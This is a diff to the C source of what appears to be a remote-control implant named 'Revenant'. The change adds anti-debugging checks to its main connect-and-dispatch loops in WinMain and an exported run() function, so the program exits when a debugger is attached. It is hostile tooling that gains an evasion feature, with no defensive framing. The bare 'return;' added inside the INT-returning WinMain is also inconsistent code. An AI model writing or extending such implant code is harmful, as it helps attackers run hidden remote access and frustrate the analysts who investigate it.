@@ -1,11 +1,12 @@
 #pragma clang diagnostic push
 #pragma ide diagnostic ignored "EndlessLoop"
 
-#include "Poly.h"
-#include "Revenant.h"
 #include "Core.h"
-#include "Transport.h"
+#include "Poly.h"
 #include "Command.h"
+#include "Revenant.h"
+#include "AntiDebug.h"
+#include "Transport.h"
 
 INSTANCE Instance = { 0 };
 
@@ -15,6 +16,10 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
     RvntInit();
 
     do {
+        if(IsDebugged()){
+            return;
+        }
+
         if (!Instance.Session.Connected) {
             if(TransportInit()) {
                 CommandDispatcher();
@@ -53,7 +58,9 @@ BOOL APIENTRY DllMain(HINSTANCE hinstDLL,  DWORD  ul_reason_for_call, LPVOID lpR
 __declspec(dllexport) VOID run(){
 
     do {
-
+        if(IsDebugged()){
+            return;
+        }
         if (!Instance.Session.Connected) {
 
             if (TransportInit()) {
